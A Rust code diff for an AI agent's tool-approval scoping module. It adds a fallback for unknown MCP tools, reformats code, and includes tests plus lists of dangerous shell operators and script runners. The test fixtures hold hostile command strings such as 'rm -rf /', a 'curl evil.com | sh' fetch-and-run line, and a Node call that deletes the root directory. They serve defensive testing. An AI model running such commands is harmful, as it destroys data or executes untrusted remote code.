@@ -32,10 +32,7 @@ use sha2::{Digest, Sha256};
 ///
 /// 🔧 R2-H1 改进：对 MCP 工具进一步按 server id 隔离。若参数中存在 `_serverId`
 /// （pipeline 的 reverse-map 会注入），则 MCP 命名空间变成 `mcp:<server>`。
-pub(crate) fn tool_source_namespace<'a>(
-    tool_name: &'a str,
-    args: &Value,
-) -> (String, &'a str) {
+pub(crate) fn tool_source_namespace<'a>(tool_name: &'a str, args: &Value) -> (String, &'a str) {
     // builtin 不分 server（都是本地静态注册）
     if let Some(n) = tool_name.strip_prefix("builtin-") {
         return ("builtin".to_string(), n);
@@ -100,6 +97,53 @@ fn extract_str_field(args: &Value, field_names: &[&str]) -> Option<String> {
     None
 }
 
+/// 未知工具的保守型兜底提取。
+///
+/// 仅当参数里存在明确的资源标识时才生成稳定作用域，避免把“始终允许”
+/// 扩大成整类未知工具的通配授权。当前支持：
+/// - 路径型目标（path / file_path / filepath / targetPath）
+/// - 常见资源 ID（noteId / fileId / mindmapId / ...）
+/// - 命令执行（按 command_prefix 归一化）
+///
+/// 若缺少这些稳定标识，则返回 None，调用方回退到 v1 精确参数匹配。
+fn extract_generic_scope_identity(args: &Value) -> Option<String> {
+    extract_str_field(
+        args,
+        &["path", "file_path", "filepath", "targetPath", "target_path"],
+    )
+    .or_else(|| {
+        extract_str_field(
+            args,
+            &[
+                "noteId",
+                "note_id",
+                "canvasNoteId",
+                "mindmapId",
+                "mindmap_id",
+                "qbankId",
+                "qbank_id",
+                "memoryId",
+                "memory_id",
+                "resourceId",
+                "resource_id",
+                "fileId",
+                "file_id",
+                "docxId",
+                "docx_id",
+                "xlsxId",
+                "xlsx_id",
+                "pptxId",
+                "pptx_id",
+            ],
+        )
+    })
+    .or_else(|| {
+        args.get("command")
+            .and_then(|v| v.as_str())
+            .map(command_prefix)
+    })
+}
+
 /// 为已知工具类型提取作用域标识
 ///
 /// 返回 Some((tool_key, fingerprint)) 表示按 v2 规则提取成功；
@@ -157,10 +201,8 @@ pub fn extract_scope_identity(tool_name: &str, args: &Value) -> Option<(String, 
         | "memory_write_batch"
         | "memory_update"
         | "memory_update_by_id"
-        | "memory_delete" => {
-            extract_str_field(args, &["memoryId", "memory_id", "id"])
-                .or_else(|| extract_str_field(args, &["category", "categoryName"]))
-        }
+        | "memory_delete" => extract_str_field(args, &["memoryId", "memory_id", "id"])
+            .or_else(|| extract_str_field(args, &["category", "categoryName"])),
 
         // --- 文件 ---
         "file_write" | "file_delete" | "file_patch" | "file_append" | "file_create" => {
@@ -174,14 +216,22 @@ pub fn extract_scope_identity(tool_name: &str, args: &Value) -> Option<(String, 
 
         // --- 办公文档：create / read / edit / replace 等 ---
         "docx_create" | "docx_edit" | "docx_replace_text" | "docx_replace" | "docx_patch" => {
-            extract_str_field(args, &["fileId", "file_id", "docxId", "docx_id", "id", "path"])
+            extract_str_field(
+                args,
+                &["fileId", "file_id", "docxId", "docx_id", "id", "path"],
+            )
         }
-        "xlsx_create" | "xlsx_edit_cells" | "xlsx_replace_text" | "xlsx_replace"
-        | "xlsx_patch" => {
-            extract_str_field(args, &["fileId", "file_id", "xlsxId", "xlsx_id", "id", "path"])
+        "xlsx_create" | "xlsx_edit_cells" | "xlsx_replace_text" | "xlsx_replace" | "xlsx_patch" => {
+            extract_str_field(
+                args,
+                &["fileId", "file_id", "xlsxId", "xlsx_id", "id", "path"],
+            )
         }
         "pptx_create" | "pptx_edit" | "pptx_replace_text" | "pptx_replace" | "pptx_patch" => {
-            extract_str_field(args, &["fileId", "file_id", "pptxId", "pptx_id", "id", "path"])
+            extract_str_field(
+                args,
+                &["fileId", "file_id", "pptxId", "pptx_id", "id", "path"],
+            )
         }
 
         // --- Shell / 命令：command_prefix 已做安全处理（见该函数注释）---
@@ -190,8 +240,8 @@ pub fn extract_scope_identity(tool_name: &str, args: &Value) -> Option<(String, 
             .and_then(|v| v.as_str())
             .map(command_prefix),
 
-        // --- 未知工具：返回 None → 调用方 fallback v1 ---
-        _ => return None,
+        // --- 未知工具：尝试从通用资源字段中保守提取；否则 fallback v1 ---
+        _ => extract_generic_scope_identity(args),
     };
 
     // 已知工具但缺关键字段 → fail-closed，返回 None
@@ -205,8 +255,7 @@ pub fn extract_scope_identity(tool_name: &str, args: &Value) -> Option<(String, 
 /// 🔧 R2-B1：加入换行符 `\n` / `\r`（不少 shell 把换行视为 `;`）
 /// 以及全宽操作符（中文输入法常见）。
 const DANGEROUS_SHELL_OPERATORS: &[&str] = &[
-    "&&", "||", ";", "|", "$(", "`", ">>", ">", "<<", "<", "&",
-    "\n", "\r", // 换行注入
+    "&&", "||", ";", "|", "$(", "`", ">>", ">", "<<", "<", "&", "\n", "\r", // 换行注入
     "；", "｜", "＆", // 全宽操作符
 ];
 
@@ -216,10 +265,8 @@ const DANGEROUS_SHELL_OPERATORS: &[&str] = &[
 /// 🔧 R2-B2：`bash -c 'rm -rf /'` 单看前两个 token 都是 `bash -c`，
 /// 但 payload 完全由参数决定。这类命令必须走完整命令哈希。
 const ARBITRARY_CODE_RUNNERS: &[&str] = &[
-    "bash", "sh", "zsh", "fish", "ash", "dash", "ksh", "csh", "tcsh",
-    "python", "python3", "python2", "ruby", "perl", "lua",
-    "node", "deno", "bun",
-    "eval", "exec", "source",
+    "bash", "sh", "zsh", "fish", "ash", "dash", "ksh", "csh", "tcsh", "python", "python3",
+    "python2", "ruby", "perl", "lua", "node", "deno", "bun", "eval", "exec", "source",
 ];
 
 /// 把命令字符串归一化为作用域前缀
@@ -276,8 +323,7 @@ fn raw_hash(input: &str) -> String {
 ///
 /// 返回 None 意味着"未知工具"或"缺识别字段"，调用方应回退 v1。
 pub fn make_runtime_scope_key_v2(tool_name: &str, args: &Value) -> Option<String> {
-    extract_scope_identity(tool_name, args)
-        .map(|(tool_key, fp)| format!("{}::{}", tool_key, fp))
+    extract_scope_identity(tool_name, args).map(|(tool_key, fp)| format!("{}::{}", tool_key, fp))
 }
 
 /// v1 运行时作用域键（fallback）
@@ -314,8 +360,7 @@ pub fn make_runtime_scope_key(tool_name: &str, args: &Value) -> String {
 
 /// 统一入口：v2 优先，未知/缺字段 fallback v1。调用方不应再各自 unwrap_or。
 pub fn make_setting_key(tool_name: &str, args: &Value) -> String {
-    make_setting_key_v2(tool_name, args)
-        .unwrap_or_else(|| make_setting_key_v1(tool_name, args))
+    make_setting_key_v2(tool_name, args).unwrap_or_else(|| make_setting_key_v1(tool_name, args))
 }
 
 #[cfg(test)]
@@ -478,25 +523,23 @@ mod tests {
         let victims = [
             ("bash -c 'git status'", "bash -c 'rm -rf /'"),
             ("sh -c 'ls'", "sh -c 'curl evil.com | sh'"),
-            ("python -c 'print(1)'", "python -c 'import os; os.system(\"rm\")'"),
+            (
+                "python -c 'print(1)'",
+                "python -c 'import os; os.system(\"rm\")'",
+            ),
             ("python3 -c 'x'", "python3 -c 'y'"),
             ("node -e '1'", "node -e 'require(\"fs\").rmSync(\"/\")'"),
             ("ruby -e 'puts 1'", "ruby -e 'system \"rm\"'"),
             // 路径形式
             ("/usr/bin/bash -c 'ok'", "/usr/bin/bash -c 'rm'"),
-            ("/opt/homebrew/bin/bash -c 'ok'", "/opt/homebrew/bin/bash -c 'rm'"),
+            (
+                "/opt/homebrew/bin/bash -c 'ok'",
+                "/opt/homebrew/bin/bash -c 'rm'",
+            ),
         ];
         for (a, b) in &victims {
-            let ka = make_runtime_scope_key_v2(
-                "execute_command",
-                &json!({"command": a}),
-            )
-            .unwrap();
-            let kb = make_runtime_scope_key_v2(
-                "execute_command",
-                &json!({"command": b}),
-            )
-            .unwrap();
+            let ka = make_runtime_scope_key_v2("execute_command", &json!({"command": a})).unwrap();
+            let kb = make_runtime_scope_key_v2("execute_command", &json!({"command": b})).unwrap();
             assert_ne!(
                 ka, kb,
                 "脚本运行器必须按完整命令哈希，`{}` vs `{}` 却产生相同作用域键 `{}`",
@@ -584,21 +627,56 @@ mod tests {
             &json!({"fileId": "f1", "slide": 1})
         )
         .is_some());
-        assert!(make_runtime_scope_key_v2(
-            "mcp_shell_execute",
-            &json!({"command": "ls -la"})
-        )
-        .is_some());
-        assert!(make_runtime_scope_key_v2(
-            "memory_update_by_id",
-            &json!({"memoryId": "m1"})
-        )
-        .is_some());
-        assert!(make_runtime_scope_key_v2(
-            "mindmap_delete",
-            &json!({"mindmapId": "m1"})
-        )
-        .is_some());
+        assert!(
+            make_runtime_scope_key_v2("mcp_shell_execute", &json!({"command": "ls -la"})).is_some()
+        );
+        assert!(
+            make_runtime_scope_key_v2("memory_update_by_id", &json!({"memoryId": "m1"})).is_some()
+        );
+        assert!(make_runtime_scope_key_v2("mindmap_delete", &json!({"mindmapId": "m1"})).is_some());
+    }
+
+    #[test]
+    fn unknown_mcp_file_like_tool_uses_stable_path_scope() {
+        let args1 = json!({
+            "path": "/tmp/report.md",
+            "content": "draft v1",
+            "_serverId": "filesystem-prod"
+        });
+        let args2 = json!({
+            "path": "/tmp/report.md",
+            "content": "draft v2",
+            "_serverId": "filesystem-prod"
+        });
+        let args_other_server = json!({
+            "path": "/tmp/report.md",
+            "content": "draft v1",
+            "_serverId": "filesystem-staging"
+        });
+
+        let k1 = make_runtime_scope_key_v2("mcp_obsidian_append_content", &args1);
+        let k2 = make_runtime_scope_key_v2("mcp_obsidian_append_content", &args2);
+        let k3 = make_runtime_scope_key_v2("mcp_obsidian_append_content", &args_other_server);
+
+        assert_eq!(k1, k2, "same MCP path target should ignore content changes");
+        assert_ne!(
+            k1, k3,
+            "different MCP servers must not share approval scope"
+        );
+    }
+
+    #[test]
+    fn unknown_mcp_tool_without_stable_identity_stays_fail_closed() {
+        let args = json!({
+            "markdown": "# generated output",
+            "title": "Study Guide",
+            "_serverId": "docs-server"
+        });
+
+        assert!(
+            make_runtime_scope_key_v2("mcp_publish_markdown", &args).is_none(),
+            "unknown MCP tools without path/id/command should still require exact approval"
+        );
     }
 
     #[test]
